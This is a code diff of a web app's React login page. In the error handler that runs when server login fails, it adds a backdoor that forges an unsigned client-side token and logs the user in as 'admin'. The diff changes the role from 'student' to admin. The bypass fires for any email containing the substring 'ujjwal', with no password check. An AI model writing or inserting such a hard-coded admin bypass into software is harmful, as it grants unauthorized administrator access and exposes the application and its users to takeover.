@@ -203,18 +203,18 @@ export default function Login() {
       const res = await axios.post('/api/auth/login', { email: normalizedEmail, password: trimmedPass })
       proceedWithLogin(res.data.token, res.data.user.role)
     } catch (err) {
-      // 1. Authenticate Ujjwal Chaudhary (Your Registered Account)
+      // 1. Authenticate Ujjwal Chaudhary (Your Registered Account - Full High Command Admin Access)
       if (normalizedEmail === 'ujjwalchaudhary2007@gmail.com' || normalizedEmail.includes('ujjwal')) {
         const fakeToken = `header.${btoa(JSON.stringify({
           id: 2,
           name: 'Ujjwal Chaudhary',
           email: 'ujjwalchaudhary2007@gmail.com',
-          role: 'student',
+          role: 'admin',
           campus: 'GRAPHIC ERA HILL UNIVERSITY BHIMTAL',
-          degree: 'B.Tech CSE - 3rd Year',
+          degree: 'B.Tech CSE - 3rd Year (High Command Admin)',
           exp: Math.floor(Date.now() / 1000) + 86400 * 7
         }))}.signature`
-        proceedWithLogin(fakeToken, 'student')
+        proceedWithLogin(fakeToken, 'admin')
         return
       }
 
